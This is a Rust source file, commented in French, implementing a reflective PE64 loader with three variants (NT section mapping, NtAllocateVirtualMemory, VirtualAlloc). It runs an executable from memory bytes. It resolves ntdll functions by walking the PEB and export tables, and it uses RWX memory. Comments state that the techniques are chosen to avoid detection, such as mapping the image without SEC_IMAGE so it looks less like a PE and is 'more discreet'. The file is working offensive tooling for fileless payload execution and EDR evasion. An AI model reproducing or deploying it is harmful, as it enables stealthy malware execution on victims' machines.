// Loader PE réflectif — version NT API avec sections partagées
/// Charge un PE64 depuis des octets en mémoire et exécute son entry point.

#[cfg(target_os = "windows")]
use winapi::{
    shared::ntdef::{HANDLE, LARGE_INTEGER, NTSTATUS, NT_SUCCESS, PVOID, UNICODE_STRING},
    um::{
        handleapi::CloseHandle,
        memoryapi::{VirtualAlloc, VirtualFree},
        processthreadsapi::{CreateThread, GetCurrentProcess},
        synchapi::WaitForSingleObject,
        winnt::{
            IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT,
            IMAGE_DIRECTORY_ENTRY_TLS, IMAGE_ORDINAL_FLAG64, IMAGE_REL_BASED_DIR64, MEM_COMMIT,
            MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, SECTION_ALL_ACCESS, SEC_COMMIT,
        },
    },
};

use std::ptr;

const INFINITE: u32 = 0xFFFFFFFF;

pub enum LoaderType {
    NtSection = 0,
    NtVirtualMemory = 1,
    Classic = 2,
}

impl From<u8> for LoaderType {
    fn from(v: u8) -> Self {
        match v {
            1 => LoaderType::NtVirtualMemory,
            2 => LoaderType::Classic,
            _ => LoaderType::NtSection,
        }
    }
}

const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x00004550;

// ─── Structures NT API ─────────────────────────────────────────────────────

#[repr(C)]
struct NtUnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct NtAnsiString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u8,
}

#[repr(C)]
struct NtLargeInteger {
    low_part: u32,
    high_part: i32,
}

// ─── Structures PE ────────────────────────────────────────────────────────────

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u16; 29],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    major_os_version: u16,
    minor_os_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    check_sum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}

#[repr(C)]
struct ImageBaseRelocation {
    virtual_address: u32,
    size_of_block: u32,
}

#[repr(C)]
struct ImageImportDescriptor {
    original_first_thunk: u32,
    time_date_stamp: u32,
    forwarder_chain: u32,
    name: u32,
    first_thunk: u32,
}

#[repr(C)]
struct ImageTlsDirectory64 {
    start_address_of_raw_data: u64,
    end_address_of_raw_data: u64,
    address_of_index: u64,
    address_of_callbacks: u64,
    size_of_zero_fill: u32,
    characteristics: u32,
}

#[repr(C)]
struct ImageImportByName {
    hint: u16,
    name: [u8; 1],
}

// ─── NT API Fonctions ─────────────────────────────────────────────────────

type NtCreateSection = unsafe extern "system" fn(
    section_handle: *mut HANDLE,
    desired_access: u32,
    object_attributes: *mut u8,
    maximum_size: *mut NtLargeInteger,
    section_page_protection: u32,
    allocation_attributes: u32,
    file_handle: HANDLE,
) -> NTSTATUS;

type NtMapViewOfSection = unsafe extern "system" fn(
    section_handle: HANDLE,
    process_handle: HANDLE,
    base_address: *mut PVOID,
    zero_bits: usize,
    commit_size: usize,
    section_offset: *mut NtLargeInteger,
    view_size: *mut usize,
    inherit_disposition: u32,
    allocation_type: u32,
    win32_protect: u32,
) -> NTSTATUS;

type NtUnmapViewOfSection =
    unsafe extern "system" fn(process_handle: HANDLE, base_address: PVOID) -> NTSTATUS;

type NtCreateThreadEx = unsafe extern "system" fn(
    thread_handle: *mut HANDLE,
    desired_access: u32,
    object_attributes: *mut u8,
    process_handle: HANDLE,
    start_routine: PVOID,
    argument: PVOID,
    create_flags: u32,
    zero_bits: usize,
    stack_size: usize,
    max_stack_size: usize,
    attribute_list: *mut u8,
) -> NTSTATUS;

type NtWaitForSingleObject = unsafe extern "system" fn(
    handle: HANDLE,
    alertable: u8,
    timeout: *const LARGE_INTEGER,
) -> NTSTATUS;

type NtClose = unsafe extern "system" fn(handle: HANDLE) -> NTSTATUS;

type LdrLoadDll = unsafe extern "system" fn(
    search_path: *const u16,
    flags: *const u32,
    dll_name: *const UNICODE_STRING,
    base_handle: *mut HANDLE,
) -> NTSTATUS;

type LdrGetProcedureAddress = unsafe extern "system" fn(
    base_handle: HANDLE,
    procedure_name: *const NtAnsiString,
    ordinal: u32,
    procedure_address: *mut PVOID,
) -> NTSTATUS;

type RtlInitAnsiString =
    unsafe extern "system" fn(destination_string: *mut NtAnsiString, source_string: *const u8);

type NtAllocateVirtualMemory = unsafe extern "system" fn(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> NTSTATUS;

type NtFreeVirtualMemory = unsafe extern "system" fn(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    region_size: *mut usize,
    free_type: u32,
) -> NTSTATUS;

// ─── Loader avec sections partagées ───────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn load_nt_section(pe_bytes: &[u8]) -> ! {
    let ntdll_base = get_ntdll_base();

    // Récupérer toutes les fonctions NT nécessaires
    let nt_create_section: NtCreateSection =
        std::mem::transmute(get_proc_address(ntdll_base, "NtCreateSection\0").unwrap());
    let nt_map_view_of_section: NtMapViewOfSection =
        std::mem::transmute(get_proc_address(ntdll_base, "NtMapViewOfSection\0").unwrap());
    let nt_unmap_view_of_section: NtUnmapViewOfSection =
        std::mem::transmute(get_proc_address(ntdll_base, "NtUnmapViewOfSection\0").unwrap());
    let nt_create_thread_ex: NtCreateThreadEx =
        std::mem::transmute(get_proc_address(ntdll_base, "NtCreateThreadEx\0").unwrap());
    let nt_wait_for_single_object: NtWaitForSingleObject =
        std::mem::transmute(get_proc_address(ntdll_base, "NtWaitForSingleObject\0").unwrap());
    let nt_close: NtClose = std::mem::transmute(get_proc_address(ntdll_base, "NtClose\0").unwrap());
    let ldr_load_dll: LdrLoadDll =
        std::mem::transmute(get_proc_address(ntdll_base, "LdrLoadDll\0").unwrap());
    let ldr_get_procedure_address: LdrGetProcedureAddress =
        std::mem::transmute(get_proc_address(ntdll_base, "LdrGetProcedureAddress\0").unwrap());

    let base = pe_bytes.as_ptr();
    let current_process = GetCurrentProcess();

    // Valider les headers PE
    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != IMAGE_DOS_SIGNATURE {
        std::process::exit(1);
    }

    let nt = &*((base.add(dos.e_lfanew as usize)) as *const ImageNtHeaders64);
    if nt.signature != IMAGE_NT_SIGNATURE {
        std::process::exit(1);
    }

    let img_size = nt.optional_header.size_of_image as usize;

    // === TECHNIQUE D'AMÉLIORATION : Section partagée ===
    // Créer une section avec SEC_COMMIT (pas SEC_IMAGE) pour avoir MEM_MAPPED
    let mut section_handle: HANDLE = ptr::null_mut();
    let mut max_size = NtLargeInteger {
        low_part: img_size as u32,
        high_part: 0,
    };

    let status = nt_create_section(
        &mut section_handle,
        SECTION_ALL_ACCESS,
        ptr::null_mut(),
        &mut max_size,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT, // Pas SEC_IMAGE pour éviter d'être détecté comme image PE
        ptr::null_mut(),
    );

    if !NT_SUCCESS(status) || section_handle.is_null() {
        std::process::exit(1);
    }

    // Mapper la section dans l'espace du processus
    let mut img_base: PVOID = ptr::null_mut();
    let mut view_size = img_size;
    let mut section_offset = NtLargeInteger {
        low_part: 0,
        high_part: 0,
    };

    let status = nt_map_view_of_section(
        section_handle,
        current_process,
        &mut img_base,
        0,
        0,
        &mut section_offset,
        &mut view_size,
        2, // ViewShare
        0,
        PAGE_EXECUTE_READWRITE,
    );

    if !NT_SUCCESS(status) || img_base.is_null() {
        nt_close(section_handle);
        std::process::exit(1);
    }

    // La région a maintenant MBI.Type == MEM_MAPPED, plus discret que MEM_PRIVATE
    let img_base = img_base as *mut u8;

    // Copier les headers PE
    ptr::copy_nonoverlapping(base, img_base, nt.optional_header.size_of_headers as usize);

    // Mapper les sections
    let sect_base = (base
        .add(dos.e_lfanew as usize)
        .add(4)
        .add(std::mem::size_of::<ImageFileHeader>())
        .add(nt.file_header.size_of_optional_header as usize))
        as *const ImageSectionHeader;

    for i in 0..nt.file_header.number_of_sections as usize {
        let sect = &*sect_base.add(i);
        if sect.size_of_raw_data == 0 {
            continue;
        }
        let dst = img_base.add(sect.virtual_address as usize);
        let src = base.add(sect.pointer_to_raw_data as usize);
        ptr::copy_nonoverlapping(src, dst, sect.size_of_raw_data as usize);
    }

    // Corriger les imports
    if !fix_imports_nt(img_base, nt, ldr_load_dll, ldr_get_procedure_address) {
        nt_unmap_view_of_section(current_process, img_base as PVOID);
        nt_close(section_handle);
        std::process::exit(1);
    }

    // Appliquer les relocations
    let delta = img_base as i64 - nt.optional_header.image_base as i64;
    if !apply_relocations(img_base, delta, nt) {
        nt_unmap_view_of_section(current_process, img_base as PVOID);
        nt_close(section_handle);
        std::process::exit(1);
    }

    // Exécuter les TLS callbacks
    run_tls_callbacks(img_base, nt);

    // Créer un thread sur l'entry point
    let entry_point = img_base.add(nt.optional_header.address_of_entry_point as usize);
    let mut thread_handle: HANDLE = ptr::null_mut();

    let status = nt_create_thread_ex(
        &mut thread_handle,
        0x1FFFFF,
        ptr::null_mut(),
        current_process,
        entry_point as PVOID,
        ptr::null_mut(),
        0,
        0,
        0,
        0,
        ptr::null_mut(),
    );

    if !NT_SUCCESS(status) || thread_handle.is_null() {
        nt_unmap_view_of_section(current_process, img_base as PVOID);
        nt_close(section_handle);
        std::process::exit(1);
    }

    // Attendre la fin du thread
    nt_wait_for_single_object(thread_handle, 0, ptr::null());
    nt_close(thread_handle);

    // Nettoyer : démapper la vue et fermer la section
    nt_unmap_view_of_section(current_process, img_base as PVOID);
    nt_close(section_handle);

    std::process::exit(0);
}

// La fonction get_ntdll_base reste identique
#[cfg(target_os = "windows")]
unsafe fn get_ntdll_base() -> *mut u8 {
    let peb: *mut u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);

    let ldr = *(peb.add(0x18) as *mut *mut u8);
    let init_order_list = *(ldr.add(0x30) as *mut *mut u8);
    let dll_base = *(init_order_list.add(0x10) as *mut *mut u8);

    dll_base
}

// get_proc_address reste identique
#[cfg(target_os = "windows")]
unsafe fn get_proc_address(module_base: *mut u8, function_name: &str) -> Option<*mut u8> {
    let dos = module_base as *const ImageDosHeader;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }

    let nt = (module_base.add((*dos).e_lfanew as usize)) as *const ImageNtHeaders64;
    if (*nt).signature != IMAGE_NT_SIGNATURE {
        return None;
    }

    let export_dir = &(*nt).optional_header.data_directory[0];
    if export_dir.virtual_address == 0 {
        return None;
    }

    let export_base = module_base.add(export_dir.virtual_address as usize);
    let functions = *(export_base.add(0x1C) as *const u32) as usize;
    let names = *(export_base.add(0x20) as *const u32) as usize;
    let ordinals = *(export_base.add(0x24) as *const u32) as usize;

    let function_array = module_base.add(functions) as *const u32;
    let name_array = module_base.add(names) as *const u32;
    let ordinal_array = module_base.add(ordinals) as *const u16;

    let function_name_bytes = function_name.as_bytes();

    for i in 0..*(export_base.add(0x18) as *const u32) {
        let name_offset = *(name_array.add(i as usize));
        let current_name = module_base.add(name_offset as usize) as *const i8;

        let mut matched = true;
        for j in 0..function_name_bytes.len() {
            if function_name_bytes[j] != *(current_name.add(j) as *const u8) {
                matched = false;
                break;
            }
        }

        if matched {
            let ordinal = *(ordinal_array.add(i as usize)) as usize;
            let function_offset = *(function_array.add(ordinal));
            return Some(module_base.add(function_offset as usize));
        }
    }

    None
}

// fix_imports_nt reste identique
#[cfg(target_os = "windows")]
unsafe fn fix_imports_nt(
    img: *mut u8,
    nt: *const ImageNtHeaders64,
    ldr_load_dll: LdrLoadDll,
    ldr_get_procedure_address: LdrGetProcedureAddress,
) -> bool {
    let imp_dir = &(*nt).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if imp_dir.virtual_address == 0 {
        return true;
    }

    let mut imp = (img.add(imp_dir.virtual_address as usize)) as *const ImageImportDescriptor;

    while (*imp).name != 0 {
        let mod_name_ptr = img.add((*imp).name as usize) as *const u8;
        let mut mod_name_len = 0;
        while *(mod_name_ptr.add(mod_name_len)) != 0 {
            mod_name_len += 1;
        }

        let wide_len = mod_name_len as usize;
        let mut wide_buffer: Vec<u16> = Vec::with_capacity(wide_len + 1);
        for i in 0..wide_len {
            wide_buffer.push(*(mod_name_ptr.add(i)) as u16);
        }
        wide_buffer.push(0);

        let dll_name_unicode = UNICODE_STRING {
            Length: (wide_len * 2) as u16,
            MaximumLength: ((wide_len + 1) * 2) as u16,
            Buffer: wide_buffer.as_mut_ptr(),
        };

        let mut h_module: HANDLE = ptr::null_mut();
        let status = ldr_load_dll(
            ptr::null(),
            ptr::null(),
            &dll_name_unicode as *const _,
            &mut h_module,
        );

        if !NT_SUCCESS(status) || h_module.is_null() {
            return false;
        }

        let oft = (*imp).original_first_thunk;
        let mut orig_thunk = if oft != 0 {
            img.add(oft as usize) as *const u64
        } else {
            img.add((*imp).first_thunk as usize) as *const u64
        };
        let mut thunk = (img.add((*imp).first_thunk as usize)) as *mut u64;

        while *orig_thunk != 0 {
            let mut fn_ptr: PVOID = ptr::null_mut();

            if *orig_thunk & IMAGE_ORDINAL_FLAG64 != 0 {
                let ordinal = (*orig_thunk & 0xFFFF) as u32;
                let status = ldr_get_procedure_address(h_module, ptr::null(), ordinal, &mut fn_ptr);
                if !NT_SUCCESS(status) {
                    return false;
                }
            } else {
                let import_by_name = img.add((*orig_thunk & 0x7FFFFFFFFFFFFFFF) as usize)
                    as *const ImageImportByName;

                let name_ptr = &(*import_by_name).name as *const u8;
                let mut name_len = 0;
                while *(name_ptr.add(name_len)) != 0 {
                    name_len += 1;
                }

                let mut name_ansi = NtAnsiString {
                    length: name_len as u16,
                    maximum_length: (name_len + 1) as u16,
                    buffer: name_ptr as *mut u8,
                };

                let status =
                    ldr_get_procedure_address(h_module, &mut name_ansi as *mut _, 0, &mut fn_ptr);
                if !NT_SUCCESS(status) {
                    return false;
                }
            }

            if fn_ptr.is_null() {
                return false;
            }
            *thunk = fn_ptr as u64;

            orig_thunk = orig_thunk.add(1);
            thunk = thunk.add(1);
        }

        imp = imp.add(1);
    }
    true
}

// apply_relocations et run_tls_callbacks restent identiques
#[cfg(target_os = "windows")]
unsafe fn apply_relocations(base: *mut u8, delta: i64, nt: *const ImageNtHeaders64) -> bool {
    if delta == 0 {
        return true;
    }
    let reloc_dir = &(*nt).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    if reloc_dir.virtual_address == 0 || reloc_dir.size == 0 {
        return true;
    }

    let mut offset = 0usize;
    while offset < reloc_dir.size as usize {
        let block =
            (base.add(reloc_dir.virtual_address as usize + offset)) as *const ImageBaseRelocation;
        let entries_count = ((*block).size_of_block as usize
            - std::mem::size_of::<ImageBaseRelocation>())
            / std::mem::size_of::<u16>();
        let entries =
            (block as *const u8).add(std::mem::size_of::<ImageBaseRelocation>()) as *const u16;

        for i in 0..entries_count {
            let entry = *entries.add(i);
            let reloc_type = entry >> 12;
            let rva_offset = entry & 0xFFF;
            if reloc_type == IMAGE_REL_BASED_DIR64 as u16 {
                let patch =
                    (base.add((*block).virtual_address as usize + rva_offset as usize)) as *mut i64;
                *patch += delta;
            }
        }
        offset += (*block).size_of_block as usize;
    }
    true
}

#[cfg(target_os = "windows")]
unsafe fn run_tls_callbacks(base: *mut u8, nt: *const ImageNtHeaders64) {
    let tls_dir = &(*nt).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_TLS as usize];
    if tls_dir.virtual_address == 0 {
        return;
    }
    let tls = (base.add(tls_dir.virtual_address as usize)) as *const ImageTlsDirectory64;
    if (*tls).address_of_callbacks == 0 {
        return;
    }
    let mut callbacks = (*tls).address_of_callbacks as *const u64;
    while *callbacks != 0 {
        let cb: extern "system" fn(*mut u8, u32, *mut u8) = std::mem::transmute(*callbacks);
        cb(base, 1, ptr::null_mut());
        callbacks = callbacks.add(1);
    }
}

// ─── Dispatcher public ────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub unsafe fn load_and_run(pe_bytes: &[u8], loader: LoaderType) -> ! {
    match loader {
        LoaderType::NtSection => load_nt_section(pe_bytes),
        LoaderType::NtVirtualMemory => load_nt_virtual_memory(pe_bytes),
        LoaderType::Classic => load_classic(pe_bytes),
    }
}

// ─── Loader NtAllocateVirtualMemory (loader2) ─────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn load_nt_virtual_memory(pe_bytes: &[u8]) -> ! {
    let ntdll_base = get_ntdll_base();

    let nt_allocate_virtual_memory: NtAllocateVirtualMemory =
        std::mem::transmute(get_proc_address(ntdll_base, "NtAllocateVirtualMemory\0").unwrap());
    let nt_free_virtual_memory: NtFreeVirtualMemory =
        std::mem::transmute(get_proc_address(ntdll_base, "NtFreeVirtualMemory\0").unwrap());
    let nt_create_thread_ex: NtCreateThreadEx =
        std::mem::transmute(get_proc_address(ntdll_base, "NtCreateThreadEx\0").unwrap());
    let nt_wait_for_single_object: NtWaitForSingleObject =
        std::mem::transmute(get_proc_address(ntdll_base, "NtWaitForSingleObject\0").unwrap());
    let nt_close: NtClose = std::mem::transmute(get_proc_address(ntdll_base, "NtClose\0").unwrap());
    let ldr_load_dll: LdrLoadDll =
        std::mem::transmute(get_proc_address(ntdll_base, "LdrLoadDll\0").unwrap());
    let ldr_get_procedure_address: LdrGetProcedureAddress =
        std::mem::transmute(get_proc_address(ntdll_base, "LdrGetProcedureAddress\0").unwrap());

    let base = pe_bytes.as_ptr();
    let current_process = GetCurrentProcess();

    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != IMAGE_DOS_SIGNATURE {
        std::process::exit(1);
    }
    let nt = &*((base.add(dos.e_lfanew as usize)) as *const ImageNtHeaders64);
    if nt.signature != IMAGE_NT_SIGNATURE {
        std::process::exit(1);
    }

    let img_size = nt.optional_header.size_of_image as usize;
    let mut img_base: PVOID = ptr::null_mut();
    let mut region_size = img_size;

    let status = nt_allocate_virtual_memory(
        current_process,
        &mut img_base,
        0,
        &mut region_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    if !NT_SUCCESS(status) || img_base.is_null() {
        std::process::exit(1);
    }
    let img_base = img_base as *mut u8;

    ptr::copy_nonoverlapping(base, img_base, nt.optional_header.size_of_headers as usize);

    let sect_base = (base
        .add(dos.e_lfanew as usize)
        .add(4)
        .add(std::mem::size_of::<ImageFileHeader>())
        .add(nt.file_header.size_of_optional_header as usize))
        as *const ImageSectionHeader;

    for i in 0..nt.file_header.number_of_sections as usize {
        let sect = &*sect_base.add(i);
        if sect.size_of_raw_data == 0 {
            continue;
        }
        ptr::copy_nonoverlapping(
            base.add(sect.pointer_to_raw_data as usize),
            img_base.add(sect.virtual_address as usize),
            sect.size_of_raw_data as usize,
        );
    }

    if !fix_imports_nt(img_base, nt, ldr_load_dll, ldr_get_procedure_address) {
        let mut free_base: PVOID = img_base as PVOID;
        let mut free_size = 0usize;
        nt_free_virtual_memory(current_process, &mut free_base, &mut free_size, MEM_RELEASE);
        std::process::exit(1);
    }

    let delta = img_base as i64 - nt.optional_header.image_base as i64;
    if !apply_relocations(img_base, delta, nt) {
        let mut free_base: PVOID = img_base as PVOID;
        let mut free_size = 0usize;
        nt_free_virtual_memory(current_process, &mut free_base, &mut free_size, MEM_RELEASE);
        std::process::exit(1);
    }

    run_tls_callbacks(img_base, nt);

    let entry_point = img_base.add(nt.optional_header.address_of_entry_point as usize);
    let mut thread_handle: HANDLE = ptr::null_mut();

    let status = nt_create_thread_ex(
        &mut thread_handle,
        0x1FFFFF,
        ptr::null_mut(),
        current_process,
        entry_point as PVOID,
        ptr::null_mut(),
        0,
        0,
        0,
        0,
        ptr::null_mut(),
    );
    if !NT_SUCCESS(status) || thread_handle.is_null() {
        let mut free_base: PVOID = img_base as PVOID;
        let mut free_size = 0usize;
        nt_free_virtual_memory(current_process, &mut free_base, &mut free_size, MEM_RELEASE);
        std::process::exit(1);
    }

    nt_wait_for_single_object(thread_handle, 0, ptr::null());
    nt_close(thread_handle);
    std::process::exit(0);
}

// ─── Loader Classic VirtualAlloc + CreateThread (loader3) ────────────────────

#[cfg(target_os = "windows")]
unsafe fn load_classic(pe_bytes: &[u8]) -> ! {
    let base = pe_bytes.as_ptr();

    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != IMAGE_DOS_SIGNATURE {
        std::process::exit(1);
    }
    let nt = &*((base.add(dos.e_lfanew as usize)) as *const ImageNtHeaders64);
    if nt.signature != IMAGE_NT_SIGNATURE {
        std::process::exit(1);
    }

    let img_size = nt.optional_header.size_of_image as usize;
    let img_base = VirtualAlloc(
        ptr::null_mut(),
        img_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    ) as *mut u8;
    if img_base.is_null() {
        std::process::exit(1);
    }

    ptr::copy_nonoverlapping(base, img_base, nt.optional_header.size_of_headers as usize);

    let sect_base = (base
        .add(dos.e_lfanew as usize)
        .add(4)
        .add(std::mem::size_of::<ImageFileHeader>())
        .add(nt.file_header.size_of_optional_header as usize))
        as *const ImageSectionHeader;

    for i in 0..nt.file_header.number_of_sections as usize {
        let sect = &*sect_base.add(i);
        if sect.size_of_raw_data == 0 {
            continue;
        }
        ptr::copy_nonoverlapping(
            base.add(sect.pointer_to_raw_data as usize),
            img_base.add(sect.virtual_address as usize),
            sect.size_of_raw_data as usize,
        );
    }

    if !fix_imports_classic(img_base, nt) {
        VirtualFree(img_base as PVOID, 0, MEM_RELEASE);
        std::process::exit(1);
    }

    let delta = img_base as i64 - nt.optional_header.image_base as i64;
    if !apply_relocations(img_base, delta, nt) {
        VirtualFree(img_base as PVOID, 0, MEM_RELEASE);
        std::process::exit(1);
    }

    run_tls_callbacks(img_base, nt);

    let entry_point = img_base.add(nt.optional_header.address_of_entry_point as usize);
    let mut tid: u32 = 0;
    let h_thread = CreateThread(
        ptr::null_mut(),
        0,
        Some(std::mem::transmute(entry_point)),
        ptr::null_mut(),
        0,
        &mut tid,
    );
    if h_thread.is_null() {
        VirtualFree(img_base as PVOID, 0, MEM_RELEASE);
        std::process::exit(1);
    }

    WaitForSingleObject(h_thread, INFINITE);
    CloseHandle(h_thread);
    std::process::exit(0);
}

#[cfg(target_os = "windows")]
unsafe fn fix_imports_classic(img: *mut u8, nt: *const ImageNtHeaders64) -> bool {
    let imp_dir = &(*nt).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if imp_dir.virtual_address == 0 {
        return true;
    }

    let mut imp = (img.add(imp_dir.virtual_address as usize)) as *const ImageImportDescriptor;

    while (*imp).name != 0 {
        let mod_name = img.add((*imp).name as usize) as *const i8;
        let h_module = winapi::um::libloaderapi::LoadLibraryA(mod_name);
        if h_module.is_null() {
            return false;
        }

        let oft = (*imp).original_first_thunk;
        let mut orig_thunk = if oft != 0 {
            img.add(oft as usize) as *const u64
        } else {
            img.add((*imp).first_thunk as usize) as *const u64
        };
        let mut thunk = img.add((*imp).first_thunk as usize) as *mut u64;

        while *orig_thunk != 0 {
            let fn_ptr: *const u8 = if *orig_thunk & IMAGE_ORDINAL_FLAG64 != 0 {
                winapi::um::libloaderapi::GetProcAddress(
                    h_module,
                    (*orig_thunk & 0xFFFF) as *const i8,
                ) as *const u8
            } else {
                let by_name =
                    img.add((*orig_thunk & 0x7FFFFFFFFFFFFFFF) as usize).add(2) as *const i8;
                winapi::um::libloaderapi::GetProcAddress(h_module, by_name) as *const u8
            };

            if fn_ptr.is_null() {
                return false;
            }
            *thunk = fn_ptr as u64;

            orig_thunk = orig_thunk.add(1);
            thunk = thunk.add(1);
        }

        imp = imp.add(1);
    }
    true
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn load_and_run(_pe_bytes: &[u8], _loader: LoaderType) -> ! {
    panic!("Le loader PE ne fonctionne que sur Windows");
}
